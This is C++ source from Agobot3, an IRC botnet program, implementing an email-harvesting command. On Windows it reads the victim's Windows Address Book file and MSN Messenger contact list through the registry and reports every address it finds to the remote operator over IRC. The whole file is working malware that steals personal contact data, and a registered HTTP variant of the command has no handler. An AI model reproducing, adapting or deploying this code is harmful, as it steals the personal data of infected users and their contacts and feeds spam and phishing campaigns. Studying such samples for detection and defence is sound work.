/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"
#include "harvest_emails.h"

void CHarvest_EMails::Init()
{	REGCMD(m_cmdEMails,  	"harvest.emails",		"makes the bot get a list of emails",			false,	this);
	REGCMD(m_cmdEMailsHTTP,	"harvest.emailshttp",	"makes the bot get a list of emails via http",	false,	this); }

bool CHarvest_EMails::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("harvest.emails"))
	{
#ifdef WIN32

		HANDLE hFile; char szPath[MAX_PATH];
		DWORD dwSize; HKEY hKey;

		dwSize=800;
		RegOpenKeyEx(HKEY_CURRENT_USER,
			"Software\\Microsoft\\WAB\\WAB4\\Wab File Name",
			0, KEY_ALL_ACCESS, &hKey);
		if(!hKey) return true;

		RegQueryValueEx(hKey, "", 0, 0, (unsigned char*)szPath, &dwSize);
		RegCloseKey(hKey);

		hFile=CreateFile((char*)szPath, GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_ALWAYS, \
			FILE_ATTRIBUTE_NORMAL, NULL);

		char *pszBuf=NULL;

		HANDLE hFileMap=CreateFileMapping(hFile, 0, \
			PAGE_READONLY, 0, 0, 0);

		if(!hFileMap) { CloseHandle(hFile); return true; }

		pszBuf=(char*)MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
		if(!pszBuf) { CloseHandle(hFileMap); CloseHandle(hFile); return true; }

		int iNos=int(*(pszBuf+0x64));
		DWORD dwAdd=MAKELONG(	MAKEWORD(*(pszBuf+0x60), *(pszBuf+0x61)),
								MAKEWORD(*(pszBuf+0x62), *(pszBuf+0x63)));

		char szA1[300]; int ii, j=0, iLen;

		for(iLen=0; iLen<(iNos*68); iLen+=68) {
			for (ii=0;ii<=68;ii++) {
				szA1[ii]=*(pszBuf+dwAdd+j+iLen); j+=2;
			}
			szA1[68]='\0'; j=0;
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found EMail (%s).", szA1);
		}

		CloseHandle(hFile);
		UnmapViewOfFile(pszBuf);
		CloseHandle(hFileMap);

				
		/* harvest msn contact list - evilbyte */
		HKEY hRegKey;
	    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\MessengerService\\ListCache\\.NET Messenger Service", 0, KEY_ALL_ACCESS, &hRegKey) != ERROR_SUCCESS)
		    return true;

        BYTE bData[1024];
        DWORD dwKeySize = sizeof(bData);
        DWORD dwType = REG_BINARY;
        char szRegKey[128];
        int i = 0;
   
		while (1)
		{
            memset(szRegKey, 0, sizeof(szRegKey));
            sprintf(szRegKey, "Allow%d", i);
            i++;

            dwKeySize = sizeof(bData);
            memset(bData, 0, sizeof(bData));

            if (RegQueryValueEx(hRegKey, szRegKey, 0, &dwType, bData, &dwKeySize) != ERROR_SUCCESS)
			{
                RegCloseKey(hRegKey);
                return true;
			}

            char *szAdress = (char *)bData;
	        g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Found EMail From MSN (%s).", szAdress);
	        Sleep(100); // prevent excess flood
		}

#endif // WIN32
	}

	if(!pMsg->sCmd.Compare("harvest.emails"))
	{
	}

	return true; }
